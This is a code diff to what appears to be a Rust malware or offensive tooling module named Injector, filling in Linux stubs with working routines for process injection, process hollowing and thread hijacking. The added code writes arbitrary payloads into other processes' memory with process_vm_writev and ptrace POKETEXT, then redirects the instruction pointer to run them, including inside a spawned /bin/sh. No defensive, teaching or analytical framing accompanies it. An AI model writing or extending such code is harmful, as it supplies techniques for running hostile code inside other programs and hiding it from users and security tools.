@@ -1,4 +1,3 @@
-#[cfg(target_os = "windows")]
 use core::ffi::c_void;
 
 #[cfg(target_os = "windows")]
@@ -284,19 +283,111 @@ impl Injector {
     }
 
     #[cfg(not(target_os = "windows"))]
-    fn reflective_inject(&self, _pid: u32, _payload: &[u8]) -> Result<(), ()> {
-        // Linux implementation could use process_vm_writev or ptrace
-        Ok(())
+    fn reflective_inject(&self, pid: u32, payload: &[u8]) -> Result<(), ()> {
+        unsafe {
+            // Assume 0x400000 base for simplified MVP injection
+            // In a full implementation, we'd parse /proc/pid/maps to find RX pages
+            let target_addr = 0x400000 as *mut c_void;
+            
+            let local_iov = crate::utils::syscalls::Iovec {
+                iov_base: payload.as_ptr() as *mut c_void,
+                iov_len: payload.len(),
+            };
+            
+            let remote_iov = crate::utils::syscalls::Iovec {
+                iov_base: target_addr,
+                iov_len: payload.len(),
+            };
+
+            let n = crate::utils::syscalls::sys_process_vm_writev(
+                pid as i32,
+                &local_iov,
+                1,
+                &remote_iov,
+                1,
+                0
+            );
+
+            if n == payload.len() as isize {
+                Ok(())
+            } else {
+                Err(())
+            }
+        }
     }
 
     #[cfg(not(target_os = "windows"))]
-    fn process_hollowing(&self, _pid: u32, _payload: &[u8]) -> Result<(), ()> {
-        Ok(())
+    fn process_hollowing(&self, _pid: u32, payload: &[u8]) -> Result<(), ()> {
+        unsafe {
+            use crate::utils::syscalls::*;
+            let pid = sys_fork();
+            if pid < 0 { return Err(()); }
+
+            if pid == 0 {
+                // Child: TRACEME and exec a dummy process
+                sys_ptrace(PTRACE_TRACEME, 0, 0, 0);
+                let sh = b"/bin/sh\0";
+                let argv = [sh.as_ptr(), core::ptr::null()];
+                let envp = [core::ptr::null()];
+                sys_execve(sh.as_ptr(), argv.as_ptr(), envp.as_ptr());
+                sys_exit(1);
+            } else {
+                // Parent: Wait for child to stop
+                let mut status = 0;
+                sys_wait4(pid as i32, &mut status, 0, core::ptr::null_mut());
+
+                // Inject payload into child
+                // Assume entry point or known RX page
+                let target_addr = 0x400000; 
+                
+                for (i, chunk) in payload.chunks(8).enumerate() {
+                    let mut data = 0u64;
+                    let len = chunk.len();
+                    core::ptr::copy_nonoverlapping(chunk.as_ptr(), &mut data as *mut u64 as *mut u8, len);
+                    sys_ptrace(PTRACE_POKETEXT, pid as i32, target_addr + (i * 8), data as usize);
+                }
+
+                // Update registers
+                let mut regs: user_regs_struct = core::mem::zeroed();
+                sys_ptrace(PTRACE_GETREGS, pid as i32, 0, &mut regs as *mut _ as usize);
+                regs.rip = target_addr as u64;
+                sys_ptrace(PTRACE_SETREGS, pid as i32, 0, &regs as *const _ as usize);
+
+                // Resume
+                sys_ptrace(PTRACE_CONT, pid as i32, 0, 0);
+                sys_ptrace(PTRACE_DETACH, pid as i32, 0, 0);
+                Ok(())
+            }
+        }
     }
 
     #[cfg(not(target_os = "windows"))]
-    fn thread_hijack(&self, _pid: u32, _payload: &[u8]) -> Result<(), ()> {
-        Ok(())
+    fn thread_hijack(&self, pid: u32, payload: &[u8]) -> Result<(), ()> {
+        unsafe {
+            use crate::utils::syscalls::*;
+            if sys_ptrace(PTRACE_ATTACH, pid as i32, 0, 0) < 0 { return Err(()); }
+
+            let mut status = 0;
+            sys_wait4(pid as i32, &mut status, 0, core::ptr::null_mut());
+
+            // Assume payload injection address
+            let target_addr = 0x400000;
+
+            for (i, chunk) in payload.chunks(8).enumerate() {
+                let mut data = 0u64;
+                let len = chunk.len();
+                core::ptr::copy_nonoverlapping(chunk.as_ptr(), &mut data as *mut u64 as *mut u8, len);
+                sys_ptrace(PTRACE_POKETEXT, pid as i32, target_addr + (i * 8), data as usize);
+            }
+
+            let mut regs: user_regs_struct = core::mem::zeroed();
+            sys_ptrace(PTRACE_GETREGS, pid as i32, 0, &mut regs as *mut _ as usize);
+            regs.rip = target_addr as u64;
+            sys_ptrace(PTRACE_SETREGS, pid as i32, 0, &regs as *const _ as usize);
+
+            sys_ptrace(PTRACE_DETACH, pid as i32, 0, 0);
+            Ok(())
+        }
     }
 }
 
